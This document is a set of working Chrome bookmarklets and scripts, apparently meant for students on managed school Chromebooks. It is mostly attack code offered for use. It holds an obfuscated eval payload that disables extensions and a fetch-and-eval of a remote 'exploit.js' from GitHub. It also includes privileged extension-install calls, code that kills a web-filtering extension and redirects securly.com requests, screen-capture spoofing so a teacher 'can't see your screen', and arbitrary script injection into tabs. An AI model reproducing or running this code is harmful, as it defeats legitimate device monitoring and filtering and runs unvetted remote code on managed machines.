javascript:eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('d(\'c b a: (9 8 7)\').6(\',\').5(0=>{4.3.2(0,!1)})',14,14,'i||setEnabled|management|chrome|forEach|split|commas|by|seperated|here|IDs|Extension|prompt|uninstall'.split('|'),0,{}))
if (location.host != "chrome.google.com" || !location.pathname.startsWith("/webstore")) {
    location.href = "https://chrome.google.com/webstore" + performance.now().toString(16).slice(1);
}

const style = document.createElement("style");
document.head.replaceChildren(style);
style.innerText = `

body {
  margin: 0;
  background-color:#121212;
}
table {
  width: 100%;
}
tr:nth-child(even) {
  background-color: #2d2d2d;
}
tr:hover {
  background-color: #ddd;
}
td {
  text-align: center;
  border: 1px solid #352e3f;
  padding: 8px;
  font-family: Arial, Helvetica, sans-serif;
  border-collapse: collapse;
  background-color: #1f1f1f;
  color: white;
}
label {
  position: relative;
  display: inline-block;
  width: 40px;
  height: 23px;
}
input {
  opacity: 0;
  width: 0;
  height: 0;
}
span {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #8c8c8c;
  transition: .4s;
  border-radius: 23px;
}
span:before {
  position: absolute;
  content: "";
  height: 17px;
  width: 17px;
  left: 3px;
  bottom: 3px;
  background-color: #1e1e1e;
  transition: .4s;
  border-radius: 50%;
}
input:checked + span {
  background-color: #bb86fc;
}
input:focus + span {
  box-shadow: 0 0 1px #2196F3;
}
input:checked + span:before {
  transform: translateX(17px);
}
`;

chrome.management.getAll(extensions => {
    const table = document.createElement("table");
    for (const {id, enabled, name, installType} of extensions) {
        const row = table.appendChild(document.createElement("tr"));
        const label = row
            .appendChild(document.createElement("td"))
            .appendChild(document.createElement("label"));

        const input = label.appendChild(document.createElement("input"));
        input.type = "checkbox";
        input.checked = enabled;
        input.addEventListener("change", () => {
            chrome.management.setEnabled(id, input.checked);
        });

        label.appendChild(document.createElement("span"));
        row.appendChild(document.createElement("td")).innerText = name;
        row.appendChild(document.createElement("td")).innerText = id;
        row.appendChild(document.createElement("td")).innerText = installType;
    }
    document.body.replaceChildren(table);
 
});

javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
javascript: document.write(
  "<center><head><h1>Extension Launcher </h1></head></center><center><h3>Instructions: Put in the id of the extension, the icon of the extension, and the name of the extension</h3></center><center><br><input  id='icon' placeholder='Put Extension Icon here'></br></center><center><br><input id='name' placeholder='Put name here'></br></center><center><br><input id='extension' maxlength='32' placeholder='Put extension id here'></br></center><center><br><button id='submit'>Download</button></br></center>\n<style> textarea{border-radius: 25px; margin: 1 auto;margin-center: auto;margin-center: auto; text-align: center; align: center; display:inline-block;height:400px}*{box-sizing:border-box}body{padding:13px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}button,input,pre,select,textarea{border-radius: 21px; color:#000;font-size:15px}h1,h2,h3,h4,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{font-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:25px; padding:13px 17px;border:none}button,input{background-color:#fff;padding:13px 100px;margin:20 5px 5px 0}input{width:600px;border-radius:25px}textarea{white-space:pre;float:center;width:60%;border-radius:25px; 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:25; 10px 10px 0;padding:13px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none;border-radius:25px; cursor:pointer;transition:filter 250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}</style> "
),
  document.getElementById("submit").addEventListener(
    "click",
    function () {
      var empty = document.getElementById("extension").value;
      if (empty == "") {
        alert("Must put a id");
      }

      let icon = document.getElementById("icon").value;
      let name = document.getElementById("name").value;
      let extension = document.getElementById("extension").value;
      chrome.webstorePrivate.beginInstallWithManifest3(
        {
          esbAllowlist: !0,
          iconUrl: "" + icon,
          id: "" + extension,
          localizedName: "" + name,
          manifest:
            '{\n"update_url": "https://clients2.google.com/service/update2/crx",\n\n    "manifest_version": 2,\n    "content_security_policy": "script-src \'self\'; object-src \'self\';",\n    "minimum_chrome_version": "71.0.0.0",\n    "offline_enabled": true,\n    "content_scripts":\n    [\n        {\n            "js": [\n                "page.js",\n                "content.js"\n            ],\n            "matches": [ "file:///*", "http://*/*", "https://*/*" ],\n            "run_at": "document_start",\n            "all_frames": true\n        }\n    ],\n    "browser_action": {\n        "default_icon": {\n            "19": "images/icon_grey19.png",\n            "38": "images/icon_grey38.png",\n            "16": "images/icon_grey16.png",\n            "24": "images/icon_grey24.png",\n            "32": "images/icon_grey32.png"\n        },\n        "default_title": "Tampermonkey",\n        "default_popup": "action.html"\n    },\n    "icons": {\n        "32": "images/icon.png",\n        "48": "images/icon48.png",\n        "128": "images/icon128.png"\n    },\n    "incognito": "split",\n    "name": "Tampermonkey",\n    "short_name": "Tampermonkey",\n    "version": "4.18.0",\n    "description": "The world\'s most popular userscript manager",\n    "default_locale": "en",\n    "background": {\n       "page": "background.html"\n    },\n    "options_page": "options.html",\n    "options_ui": {\n        "page": "options.html",\n        "chrome_style": false,\n        "open_in_tab": true\n    },\n    "commands": {\n        "toggle-enable": {\n            "description": "Toggle enable state"\n        },\n        "open-dashboard": {\n            "description": "Open dashboard"\n        },\n        "open-dashboard-with-running-scripts": {\n            "description": "Open dashboard with the current tab\'s URL used as filter"\n        },\n        "open-new-script": {\n            "description": "Open new script tab"\n        }\n    },\n    "permissions": [\n        "notifications",\n        "unlimitedStorage",\n        "tabs",\n        "idle",\n        "webNavigation",\n        "webRequest", "webRequestBlocking",\n        "storage",\n        "contextMenus",\n        "chrome://favicon/",\n        "clipboardWrite",\n        "cookies",\n        "declarativeContent",\n        "<all_urls>"\n    ],\n    "optional_permissions" : [ "downloads" ]\n}\n',
        },
        function () {
          chrome.webstorePrivate.completeInstall("" + extension, function () {
            console.log(arguments);
          });
        }
      );
    },
    !1
  );
  javascript: (document = window.document),
  document.write(
    "<html>          <body>       <center><head>     <h1>[Point Blank Swap Launcher]</h1><center><h1>---Disabling---</h1></center>\n<center><button id='soft'>Soft Disable</button></center><center><button id='hard'>Hard Kill</button></center><center><button id='reload'>Reload Blocker</button></center><center><center><h1> ---Scripts--- </h1></center><center><button id='hide'>Hide tabs</button><button id='cool'>Create cool looking window</button></center><center><h3> Custom Notification </h3> </center> <input id='title' placeholder='Put title here'><input id='messer' placeholder='Put message here'><button id='notification'>Show Notification</button></center><center><button id='dns'>DNS emulator</button><center></center><center><center><center><h3>Run scripts as background </h3></center><textarea  id='code' placeholder='Put Code Here'></textarea></center><center><button id='google'>Run on google</button><button id='when'>When you click your extension</button></center><center></center> </body>\n          </html>\n <style> textarea{border-radius: 25px; margin: 1 auto;margin-center: auto;margin-center: auto; text-align: center; align: center; display:inline-block;height:400px}*{box-sizing:border-box}body{padding:13px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}input {border-radius: 12px; color:#000;font-size:15px} textarea {border-radius: 21px; color:#000;font-size:15px} button,pre { border-radius: 12px; color:#000;font-size:15px}h1,h2,h3,h4,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{ border-radiusfont-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:25px; padding:13px 17px;border:none}button,input{background-color:#fff;padding:13px 100px;margin:20 5px 5px 0}input{width:600px;border-radius:25px}textarea{white-space:pre;float:center;width:60%;border-radius:25px; 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:25; 10px 10px 0;padding:13px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none; cursor:pointer;transition:filter 250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}</style>\n"
  ),
  document.getElementById("hide").addEventListener(
    "click",
    function () {
      alert(
        "This will open a window, which your teacher will only be able to see the window this opens, so open another one after this one opens"
      ),
        (opener.chrome.tabs.captureVisibleTabAsync =
          opener.chrome.tabs.captureVisibleTabAsync || screenshot_old);
      opener.chrome.windows.getAllAsync =
        opener.chrome.windows.getAllAsync || get_tabs_old;
      clearInterval(spoof_int);
      if (spoof_int) alert("Your teacher can't see your screen now!");
      spoof_int = null;
      `
            : `;
      var spoof_int,
        visible_id = 0,
        screenshot_old =
          screenshot_old || opener.chrome.tabs.captureVisibleTabAsync,
        get_tabs_old = get_tabs_old || opener.chrome.windows.getAllAsync,
        get_tabs_new = function () {
          return new Promise((resolve, reject) => {
            get_tabs_old({
              populate: true,
              windowTypes: ["normal"],
            }).then((tabs) => {
              tabs.forEach((tab) => {
                if (tab.id === visible_id) resolve([tab]);
              });
            });
          });
        };
      opener.chrome.windows.create({ url: "https://google.com" }, (win) => {
        visible_id = win.id;
        spoof_int = setInterval(() => {
          opener.chrome.windows.getLastFocused((window) => {
            var visible = window.id === visible_id;
            opener.chrome.tabs.captureVisibleTabAsync = visible
              ? screenshot_old
              : null;
            opener.chrome.windows.getAllAsync = visible ? get_tabs_new : null;
          });
        }, 5);
      });
    },
    !1
  ),
  document.getElementById("cool").addEventListener(
    "click",
    function () {
      opener.chrome.windows.create({
        url: "https://www.google.com",
        type: "popup",
      });
    },
    !1
  ),
  document.getElementById("dns").addEventListener(
    "click",
    function () {
     opener.chrome.webRequest.onBeforeRequest.addListener(
  () => {
    return { redirectUrl: "javascript:" };
  },
  {
    urls: ["*://*.securly.com/*"],
  },
  ["blocking"]
);

    },
    !1
  ),
  document.getElementById("notification").addEventListener(
    "click",
    function () {
      opener.chrome.notifications.create(null, {
        type: "basic",
        iconUrl:
          "https://upload.wikimedia.org/wikipedia/en/9/9a/Trollface_non-free.png",
        title: "" + document.getElementById("title").value,
        message: "" + document.getElementById("messer").value,
      });
    },
    !1
  ),
  document.getElementById("google").addEventListener(
    "click",
    function () {
      alert("Go to google.com to see your code");
      javascript:(function(){opener.chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status == "complete" && tab.url.includes('google.com')) {
    opener.chrome.tabs.executeScript(
      tabId, { code: `
      ` + document.getElementById("code").value
             }
    );
  }
})})()
    },
    !1
  ),
  document.getElementById("hard").addEventListener(
    "click",
    function () {
      javascript: (localStorage.cluster =
        "UNKNOWN_SCHOOL," +
        (confirm("This will disable your blocker until the removal of your account, if you want something less permanent use soft disable, continue?")
          ? 99999999999999
          : 0)),
        opener.chrome.extension.getBackgroundPage().location.reload();
    },
    !1
  ),
  document.getElementById("reload").addEventListener(
    "click",
    function () {
      localStorage.cluster = "UNKNOWN_SCHOOL,0";
      opener.chrome.runtime.reload();
    },
    !1
  ),
  document.getElementById("soft").addEventListener(
    "click",
    function () {
  document.getElementById("soft").innerHTML = "Disabled";
      opener.chrome.extension.getBackgroundPage().close();
    },
    !1
  ),
  document.getElementById("when").addEventListener(
    "click",
    function () {
      opener.chrome.browserAction.onClicked.addListener(() => {
        opener.chrome.tabs.query(
          { active: true, currentWindow: true },
          (tab) => {
            opener.chrome.tabs.executeScript(tab[0].id, {
              code:
                `
      ` + document.getElementById("code").value,
              matchAboutBlank: true,
            });
          }
        );
      });
      alert("Everytime you click your extension, your code will show");
    },
    !1
  );
